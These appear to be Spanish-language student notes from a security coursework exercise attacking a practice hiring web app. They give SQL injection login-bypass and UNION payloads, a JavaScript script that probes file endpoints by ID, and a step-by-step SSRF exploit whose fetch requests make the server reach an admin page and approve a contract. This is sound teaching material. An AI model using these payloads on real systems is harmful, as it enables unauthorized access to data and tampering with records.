Para el sql injection:

* Se puede usar: ' OR '1'='1 tanto en DNI y Password. 
* O usar: ' OR '1'='1' -- solo en DNI, porque el '--' hace que las demas condiciones de la query que ejecuta del lado de servidor sea comentada.
' UNION SELECT * FROM users HAVING 1=1;--

Script para hacer recon:

const endpoints = [
    "/files/receipts",
    "/files/contracts",
    "/files/contratos",
    "/files/fichajes",
    "/files/contract",
    "/files/contrataciones"
];

const idStart = 750;
const idEnd = 760;

// Función para probar cada endpoint con el rango de IDs
async function probeEndpoints() {
    for (const endpoint of endpoints) {
        for (let id = idStart; id <= idEnd; id++) {
            const url = `${endpoint}/${id}`;
            try {
                const response = await fetch(url, { method: "GET" });
                if(response.status == 200){
                    const text = await response.text();
                    console.log(`Respuesta para ${url}: ${text}`);
                }
            } catch (error) {
                console.error(`Error en ${url}:`, error);
            }
        }
    }
}

probeEndpoints();



Script para descifrar archivo decrypt.java
javac decrypt.java   -- comando para compilar
java decrypt 755.des descifrado.pdf listado.txt  -- comando para ejecutar


http://localhost:8080/formV2024?ce=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZF9jb250cmFjdCI6Ijc1NSIsImVtYWlsIjoiZWplbXBsb0BnbWFpbC5jb20iLCJleHAiOjE3MzE5Nzc4MzN9.m0zs_OFw81j0zumwecwEvBm5GWrbENWkMGXloopGQRU

SSRF

Paso 1
Acceder al formulario --> aceptar la propuesta (Se esta aceptando la propuesta del 754)

Paso 2
Se observa que se hace aprobo la contratacion exitosamente, una llamada a http://localhost:8080/api/contract , donde se le pasa
   --->email: "ejemplo@gmail.com"
   --->url: "https://tp-seg-app-web.onrender.com/api/approve/754"

Paso 3
Se envia la solicitud pero cambiando la url por https://tp-seg-app-web.onrender.com/api/approve/admin;
		Se obtiene el siguiente html con los contratos disponibles para aprobar, se valida el id y el contratante


fetch('http://localhost:8080/api/contract', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: "ejemplo@gmail.com",
        url: "https://tp-seg-app-web.onrender.com/api/admin"
    })
})
.then(response => {
    if (!response.ok) {
        throw new Error('Error en la solicitud: ' + response.statusText);
    }
    return response.json().catch(() => response.text()); // Intentar JSON, y si falla, usar texto
})
.then(data => console.log('Respuesta del servidor:', data))
.catch(error => console.error('Error:', error));

<html>

<head>
    <title>Contract Admin Page</title>
</head>

<body>
    <h2>IDs Available for Approval</h2>
    <ul>
        <li>ID: 101 - Name: Juan Pérez</li>
        <li>ID: 234 - Name: Ana Gómez</li>
        <li>ID: 356 - Name: Carlos Rodríguez</li>
        <li>ID: 478 - Name: Laura Sánchez</li>
        <li>ID: 512 - Name: José Martínez</li>
        <li>ID: 634 - Name: María López</li>
        <li>ID: 756 - Name: David Fernández</li>
        <li>ID: 879 - Name: Pedro García</li>
        <li>ID: 910 - Name: Marta Ruiz</li>
        <li>ID: 102 - Name: Luis Díaz</li>
    </ul>
</body>

</html>


Paso 4
Se Procede a corer el siguiente script para aprobar la contratacion, teniendo el id del Empleado a Contratar(879) --> https://tp-seg-app-web.onrender.com/api/approve/879:

fetch('http://localhost:8080/api/contract', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: "ejemplo@gmail.com",
        url: "https://tp-seg-app-web.onrender.com/api/approve/879"
    })
})
.then(response => {
    if (!response.ok) {
        throw new Error('Error en la solicitud: ' + response.statusText);
    }
    return response.json().catch(() => response.text()); // Intentar JSON, y si falla, usar texto
})
.then(data => console.log('Respuesta del servidor:', data))
.catch(error => console.error('Error:', error));



Paso 4
Se envia la solicitud pero cambiando la url por https://tp-seg-app-web.onrender.com/api/admin; Y se observa que el 879 ya no aparece entre los disponibles

<html>

<head>
    <title>Contract Admin Page</title>
</head>

<body>
    <h2>IDs Available for Approval</h2>
    <ul>
        <li>ID: 101 - Name: Juan Pérez</li>
        <li>ID: 234 - Name: Ana Gómez</li>
        <li>ID: 356 - Name: Carlos Rodríguez</li>
        <li>ID: 478 - Name: Laura Sánchez</li>
        <li>ID: 512 - Name: José Martínez</li>
        <li>ID: 634 - Name: María López</li>
        <li>ID: 756 - Name: David Fernández</li>
        <li>ID: 910 - Name: Marta Ruiz</li>
        <li>ID: 102 - Name: Luis Díaz</li>
    </ul>
</body>

</html>